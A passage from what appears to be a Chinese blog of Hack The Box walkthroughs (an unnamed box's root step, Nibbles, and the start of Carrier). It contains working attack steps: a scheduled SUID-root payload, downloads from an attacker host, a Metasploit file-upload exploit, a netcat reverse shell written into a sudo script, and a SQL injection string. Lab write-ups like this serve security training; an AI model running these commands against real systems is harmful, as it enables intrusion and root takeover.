class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Linux</span> <span class="hljs-string">Kernel</span> <span class="hljs-number">4.4</span><span class="hljs-number">.0</span> <span class="hljs-string">(Ubuntu)</span> <span class="hljs-bullet">-</span> <span class="hljs-string">DCCP</span> <span class="hljs-string">Double-Free</span> <span class="hljs-string">Privilege</span> <span class="hljs-string">Escalation</span> <br><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Linux</span> <span class="hljs-string">Kernel</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-116</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-number">16.04</span><span class="hljs-number">.4</span><span class="hljs-string">)</span> <span class="hljs-bullet">-</span> <span class="hljs-string">Local</span> <span class="hljs-string">Privilege</span> <span class="hljs-string">Escalation</span>  <br><span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">Linux</span> <span class="hljs-string">Kernel</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-83</span> <span class="hljs-string">/</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">4.8</span><span class="hljs-number">.0</span><span class="hljs-number">-58</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-number">14.04</span><span class="hljs-string">/16.04)</span> <span class="hljs-bullet">-</span> <span class="hljs-string">Local</span> <span class="hljs-string">Privilege</span> <span class="hljs-string">Escalation</span> <span class="hljs-string">(KASLR</span> <br><br><span class="hljs-string">gcc</span> <span class="hljs-string">-h</span><br><span class="hljs-string">the</span> <span class="hljs-string">program</span> <span class="hljs-string">&#x27;gcc&#x27;</span> <span class="hljs-string">is</span> <span class="hljs-string">currently</span> <span class="hljs-string">not</span> <span class="hljs-string">installed.</span> <br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">cat</span> <span class="hljs-string">/etc/passwd</span> <span class="hljs-string">|</span> <span class="hljs-string">grep</span> <span class="hljs-string">home</span><br><span class="hljs-string">ps</span> <span class="hljs-string">-ef</span> <span class="hljs-string">|</span> <span class="hljs-string">grep</span> <span class="hljs-string">root</span><br><span class="hljs-string">root</span>      <span class="hljs-number">1083     </span><span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-string">Mar15</span> <span class="hljs-string">?</span>        <span class="hljs-number">00</span><span class="hljs-string">:00:00</span> <span class="hljs-string">/usr/sbin/cron</span> <span class="hljs-string">-f</span><br><br></code></pre></div></td></tr></table></figure><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">/var/www/<span class="hljs-keyword">admin</span>/config.php<br><span class="hljs-keyword">admin</span><br>kEjdbRigfBHUREiNSDs<br><br>mysql -h localhost -u <span class="hljs-keyword">admin</span> -p<br>输入密码<br><br><span class="hljs-keyword">show</span> databases;<br> information_schema <br> <span class="hljs-keyword">admin</span> <br><br>use information_schema;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>; <br><br>use <span class="hljs-keyword">admin</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>; <br>users<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users;<br>|  <span class="hljs-number">1</span> | <span class="hljs-keyword">admin</span>    | <span class="hljs-number">4</span>f5fffa7b2340178a716e3832451e058 <br><br><span class="hljs-keyword">select</span> VERSION();<br><span class="hljs-number">5.7</span><span class="hljs-number">.17</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.16</span><span class="hljs-number">.04</span><span class="hljs-number">.2</span> <br></code></pre></div></td></tr></table></figure><p>获得了一串密文，4f5fffa7b2340178a716e3832451e058<br>不知道明文是不是kEjdbRigfBHUREiNSDs。</p><p>如果是，那就不用破解了；如果不是，那就可以尝试su root，用mysql中获取的口令。</p><p>md5在线加密<code>kEjdbRigfBHUREiNSDs</code>，经过对比，发现不是。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/5.PNG" alt="5"></p><p>WTF，竟然要我掏钱。</p><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p>crontab定时任务</p><p>在linux中，每个用户都有自己的cron job。只要在文本中写入条目，linux就会定时运行该任务。</p><p>cron的格式：</p><table><thead><tr><th>分钟</th><th>小时</th><th>天</th><th>月份</th><th>工作日</th><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>02</td><td><code>*</code></td><td><code>*</code></td><td><code>*</code></td><td><code>*</code></td><td><code>/home/xx/xx.sh</code></td><td>每天每小时的第二分钟执行脚本xx.sh</td></tr><tr><td>00</td><td>5，6，7</td><td><code>*</code></td><td><code>*</code></td><td><code>*</code></td><td><code>/home/xx/xx.sh</code></td><td>每天的第5，6，7小时的0分，执行脚本xx.sh</td></tr></tbody></table><p>crontab -l<br>crontab -e 打开用户的cron job.</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/7.PNG" alt="7"></p><p>root      1102     1  0 10:35 ?        00:00:00 /usr/sbin/cron -f</p><p>通过上传LinEnum.sh，运行后发现，可以尝试破解密文。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/8.PNG" alt="8"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/9.PNG" alt="9"></p><h4 id="Kernel-php"><a href="#Kernel-php" class="headerlink" title="Kernel.php"></a>Kernel.php</h4><p>find / -name Kernel.php 2&gt;/dev/null</p><p>/var/www/laravel/app/Console/Kernel.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Console</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Console</span>\<span class="hljs-title">Scheduling</span>\<span class="hljs-title">Schedule</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Console</span>\<span class="hljs-title">Kernel</span> <span class="hljs-title">as</span> <span class="hljs-title">ConsoleKernel</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Kernel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ConsoleKernel</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The Artisan commands provided by your application.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$commands</span> = [<br>        <span class="hljs-comment">//</span><br>    ];<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Define the application&#x27;s command schedule.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Console\Scheduling\Schedule  $schedule</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">schedule</span>(<span class="hljs-params">Schedule <span class="hljs-variable">$schedule</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><span class="hljs-variable">$schedule</span>-&gt;exec(<span class="hljs-string">&#x27;chown root:root /tmp/shell;chmod 4777 /tmp/shell&#x27;</span>)-&gt;everyMinute();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Register the Closure based commands for the application.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commands</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">require</span> base_path(<span class="hljs-string">&#x27;routes/console.php&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>curl <a href="http://10.10.14.7/cat">http://10.10.14.7/cat</a> -o shell<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/13.PNG" alt="13"></p><p>将本地的cat二进制文件发送到目标机，保存为/tmp/shell。</p><p>稍等片刻，约一分钟左右，该文件为suid权限。<br>运行该文件，即可以root权限查看/root/root.txt</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>进一步加深认识了suid权限。</p><p>其中，尝试将netcat写入/tmp/shell，尝试将python脚本写入/tmp/shell，都以失败告终。</p><p>只有编译的程序才可以使用root权限。</p><p>bash script and python script即使有suid权限，运行的命令也不是root权限。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nibbles（sudo no pass )</title>
    <link href="/2019/03/14/x/"/>
    <url>/2019/03/14/x/</url>
    
    <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>nmap -sS -Pn 10.10.10.75 -vv</code></p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">**<span class="hljs-number">22</span>/tcp    <span class="hljs-keyword">open</span>     ssh             syn-ack ttl <span class="hljs-number">63</span>**<br><span class="hljs-number">30</span>/tcp    filtered <span class="hljs-type">unknown</span>         <span class="hljs-keyword">no</span>-response<br>**<span class="hljs-number">80</span>/tcp    <span class="hljs-keyword">open</span>     http            syn-ack ttl <span class="hljs-number">63</span>**<br><span class="hljs-number">646</span>/tcp   filtered ldp             <span class="hljs-keyword">no</span>-response<br><span class="hljs-number">705</span>/tcp   filtered agentx          <span class="hljs-keyword">no</span>-response<br><span class="hljs-number">1001</span>/tcp  filtered webpush         <span class="hljs-keyword">no</span>-response<br><span class="hljs-number">1043</span>/tcp  filtered boinc           <span class="hljs-keyword">no</span>-response<br><span class="hljs-number">1052</span>/tcp  filtered ddt             <span class="hljs-keyword">no</span>-response<br></code></pre></div></td></tr></table></figure><h3 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h3><blockquote><p>Info1:  <code>Apache/2.4.18 (Ubuntu) Server</code></p></blockquote><blockquote><p>Info2:<code>http://10.10.10.75/nibbleblog/themes/note-2/views/blog/view.bit</code><br>var HTML_PATH_ROOT = “/nibbleblog/“;var HTML_PATH_ADMIN = “/nibbleblog/admin/“;var HTML_PATH_ADMIN_AJAX = “/nibbleblog/admin/ajax/“;var HTML_PATH_ADMIN_JS = “/nibbleblog/admin/js/“;var HTML_PATH_ADMIN_TEMPLATES = “/nibbleblog/admin/templates/“;var _MAX_FILE_SIZE = 1024 * 3000;</p></blockquote><blockquote><p>Info3:<code>/nibbleblog/admin/templates/</code><br>在这个目录下找到一些图片，有一些图片，看时间是今天，明显是其他人传上去的webshell。</p></blockquote><blockquote><p>Info4: <code>feed.php</code>，有人新建了一个用户。说明有些关键的文件我还没发现。</p></blockquote><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/%E6%8D%95%E8%8E%B7%204.PNG"></p><blockquote><p>Info5:<code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/db.xml</code><br>&lt;plugin name=”My image” author=”Diego Najar”<br>该插件，有一个作者名称，说不定有用，mark一下。</p></blockquote><p>GET /nibbleblog/index.php?controller=post&amp;action=view&amp;id_post=7 HTTP/1.1</p><p>经过上面的信息搜集，摸索到了一些头绪。<br>在上传图片时，nibbleBlog没有检查文件类型，于是可以上传php文件。<br><a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">参考资料：nibbleBlog命令执行漏洞</a></p><p>以上的信息都是经过<strong>以下步骤</strong>获取，为了方便查看，统一放在此处。</p><hr><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/hh.PNG" alt="查看源代码"><br>好，既然说了<strong>这里没有什么有趣的！</strong><br>此地无银三百两。。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/hhh.PNG" alt="查看博客首页"></p><ul><li>Trying<br>dirbuster目录扫描，发现目录遍历。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/hhhh.PNG" alt="web目录扫描"></li></ul><p>通过目录遍历，翻找发现，很多文件都是xml（可扩展标记语言文件）。怀疑有xxe漏洞，xml external entyty，xml外部实体注入。</p><ul><li>Trying 进行验证<br>在feed.php源码，<code>http://10.10.10.75/nibbleblog/feed.php</code></li></ul><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/%E6%8D%95.PNG"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/%E6%8D%95%E8%8E%B7.PNG"></p><p>在burp数据包添加xml语句，返回包并没有什么不同。。难道并没有xml外部实体注入？<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/%E6%8D%95%E8%8E%B7%202.PNG"></p><p>发现一个页面，有xml解析错误。说明对xml文件有解析。。经验不够，分析不出什么了。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/%E6%8D%95%E8%8E%B7%203.PNG" alt="捕获 3"></p><ul><li>Trying ：找后台</li></ul><p>通过google搜索，得知该cms的后台<br><code>http://10.10.10.75/nibbleblog/admin.php</code><br>就尝试登陆了一次，提示<code>Nibbleblog security error - Blacklist protection</code><br>就被加入了黑名单。。</p><hr><h2 id="文件上传获得shell"><a href="#文件上传获得shell" class="headerlink" title="文件上传获得shell"></a>文件上传获得shell</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/multi/http/nibbleblog_file_upload<br><span class="hljs-builtin-name">set</span> RHOSTS 10.10.10.75<br><span class="hljs-builtin-name">set</span> USERNAME admin<br><span class="hljs-builtin-name">set</span> PASSWORD nibbles<br><span class="hljs-builtin-name">set</span> TARGETURI /nibbleblog<br><span class="hljs-builtin-name">run</span><br><br>获得meterpreter shell<br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>参考以前做过的方式<br><a href="https://whale3070.github.io/training/2018/11/10/x/">LTR Scene（php写入一句话+sudoer提权）</a></p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">/usr/bin/python3.<span class="hljs-number">5</span> -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>uname -a 说明<span class="hljs-number">64</span>位linux<br><br>sudo -l<br><br><span class="hljs-symbol">sudo:</span> unable to resolve host <span class="hljs-symbol">Nibbles:</span> Connection timed out<br>Matching Defaults entries <span class="hljs-keyword">for</span> nibbler on <span class="hljs-symbol">Nibbles:</span><br>    env_reset, mail_badpass,<br>    secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br>User nibbler may run the following commands on <span class="hljs-symbol">Nibbles:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /home/nibbler/personal/stuff/monitor.sh<br><br><br>whereis nc<br><br><br>cd /home/nibbler/personal/stuff/<br>wget <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.10.14.7:800/netcat</span><span class="hljs-number">-64</span><br>chmod a+x netcat<span class="hljs-number">-64</span><br>kali : nc -lnvp <span class="hljs-number">9900</span><br>echo <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; monitor.sh<br>echo <span class="hljs-string">&quot;./netcat-64 -e /bin/bash 10.10.14.7 9900&quot;</span> &gt;&gt;  monitor.sh<br>chmod a+x monitor.sh<br>sudo ./monitor.sh<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-14/11.PNG" alt="11"></p><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>不必上传netcat。</p><p>monitor.sh</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">bash -<span class="hljs-selector-tag">i</span><br></code></pre></div></td></tr></table></figure><p>运行<code>sudo ./monitor.sh</code>后，本地即可从nibbler到root</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一般来说，黑名单限制登陆，是不允许暴力破解的。</p><p>但是这个靶机用的是弱密码，=。=</p><p>这就很尴尬了</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Carrier(snmp泄露敏感信息)</title>
    <link href="/2019/03/12/x/"/>
    <url>/2019/03/12/x/</url>
    
    <content type="html"><![CDATA[<h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight lisp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lisp"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span> (<span class="hljs-name">Ubuntu</span> Linux<span class="hljs-comment">; protocol 2.0)</span><br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> <span class="hljs-number">15</span><span class="hljs-symbol">:a4</span>:<span class="hljs-number">28</span>:<span class="hljs-number">77</span><span class="hljs-symbol">:ee</span>:<span class="hljs-number">13</span>:<span class="hljs-number">07</span>:<span class="hljs-number">06</span>:<span class="hljs-number">34</span>:<span class="hljs-number">09</span>:<span class="hljs-number">86</span><span class="hljs-symbol">:fd</span>:<span class="hljs-number">6</span>f<span class="hljs-symbol">:cc</span>:<span class="hljs-number">4</span>c<span class="hljs-symbol">:e2</span> (<span class="hljs-name">RSA</span>)<br>|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">89</span>:<span class="hljs-number">5</span>a<span class="hljs-symbol">:ee</span>:<span class="hljs-number">1</span>c:<span class="hljs-number">22</span>:<span class="hljs-number">02</span><span class="hljs-symbol">:d2</span>:<span class="hljs-number">13</span>:<span class="hljs-number">40</span><span class="hljs-symbol">:f2</span>:<span class="hljs-number">45</span>:<span class="hljs-number">2</span>e:<span class="hljs-number">70</span>:<span class="hljs-number">45</span><span class="hljs-symbol">:b0</span><span class="hljs-symbol">:c4</span> (<span class="hljs-name">ED25519</span>)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((<span class="hljs-name">Ubuntu</span>))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not set<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Login<br></code></pre></div></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">gobuster</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br>/<span class="hljs-selector-tag">img</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br>/<span class="hljs-selector-tag">tools</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br>/<span class="hljs-selector-tag">doc</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br>/<span class="hljs-selector-tag">css</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br>/<span class="hljs-selector-tag">js</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br>/<span class="hljs-selector-tag">fonts</span> (<span class="hljs-attribute">Status</span>: <span class="hljs-number">301</span>)<br></code></pre></div></td></tr></table></figure><hr><p>searchsploit lyghtspeed</p><p>google “lightspeed login exploit”</p><hr><p>admin’ or ‘1’=’1’</p><p>Invalid username/password </p><p>sqlmap -r 1.req</p><hr><h4 id="info"><a href="#info" class="headerlink" title="info"></a>info</h4><p><a href="http://10.10.10.105/doc/error_codes.pdf">http://10.10.10.105/doc/error_codes.pdf</a></p><p>45007 证书无效或者过期</p><p>45009 尚未设置系统凭据</p><p>默认管理员用户密码已设置（请参阅机箱序列号）<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-12/9.PNG" alt="9"></p><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.105</span><span class="hljs-regexp">/tools/</span>remote.php<br>License expired, exiting...<br></code></pre></div></td></tr></table></figure><h4 id="nmap-snmp-scan"><a href="#nmap-snmp-scan" class="headerlink" title="nmap snmp scan"></a>nmap snmp scan</h4><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">nmap -<span class="hljs-keyword">sU</span> 10.10.10.105 -vv<br>67/udp  <span class="hljs-keyword">open</span>|filtered dhcps   <span class="hljs-keyword">no</span>-response<br>161/udp <span class="hljs-keyword">open</span>          snmp    udp-response ttl 62<br></code></pre></div></td></tr></table></figure><p>参考资料：<a href="https://whale3070.github.io/tools/2016/11/01/x">nmap-script-scan</a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">locate *snmp*.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-brute.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-hh3c-logins.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-info.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-interfaces.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-ios-config.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-netstat.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-processes.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-sysdescr.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-win32-services.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-win32-shares.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-win32-software.nse<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nmap/</span>scripts/snmp-win32-users.nse<br></code></pre></div></td></tr></table></figure><blockquote><p>nmap –script=snmp-info.nse 10.10.10.105 -sU -p 161<br>PORT    STATE SERVICE<br>161/udp open  snmp<br>| snmp-info:<br>|   enterprise: pysnmp<br>|   engineIDFormat: octets<br>|   engineIDData: 77656201e8e908<br>|   snmpEngineBoots: 2<br>|_  snmpEngineTime: 3d20h55m11s</p></blockquote><blockquote><p>nmap –script=snmp-brute.nse 10.10.10.105 -sU -p 161<br>PORT    STATE SERVICE<br>161/udp open  snmp<br>| snmp-brute:<br>|_  public - Valid credentials</p></blockquote><blockquote><p>nmap –script=snmp-processes.nse 10.10.10.105 -sU -p 161<br>nmap –script=snmp-netstat.nse 10.10.10.105 -sU -p 161<br>nmap –script=brute 10.10.10.105 -sU -p 161<br>nmap –script=snmp-hh3c-logins.nse 10.10.10.105 -sU -p 161<br>snmp-hh3c-logins.nse</p></blockquote><h4 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a>snmpwalk</h4><ul><li><a href="https://github.com/grutz/h3c-pt-tools/blob/master/hh3c-usermib-disclosure.txt">https://github.com/grutz/h3c-pt-tools/blob/master/hh3c-usermib-disclosure.txt</a></li><li><a href="https://www.comparitech.com/net-admin/snmpwalk-examples-windows-linux/">https://www.comparitech.com/net-admin/snmpwalk-examples-windows-linux/</a></li><li><a href="https://www.huawei.com/cn/psirt/security-advisories/hw-u_194647">https://www.huawei.com/cn/psirt/security-advisories/hw-u_194647</a></li></ul><p>MIB代表management information base，管理信息库，保存网络中各种设备的参数信息。</p><p>snmpwalk -h</p><p>snmpwalk -c public -v 1 10.10.10.105<br>请求OID对象标识<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-12/14.PNG" alt="14"></p><p>OID对象标识就是<code>3.6.1.2.1.47.1.1.1.1.11</code><br>前六位<code>3.6.1.2.1.47</code>，代表主机或路由器的<strong>操作系统</strong></p><hr><p>snmpwalk -v1 -c public 10.10.10.105 .3.6.1.2.1.47.1.1.1.1.11<br>iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: “SN#NET_45JDX23”<br>End of MIB</p><hr><p>-O OUTOPTS<br>n:  print OIDs numerically<br>snmpwalk -v1 -On -c public 10.10.10.105</p><p>.1.3.6.1.2.1.47.1.1.1.1.11 = STRING: 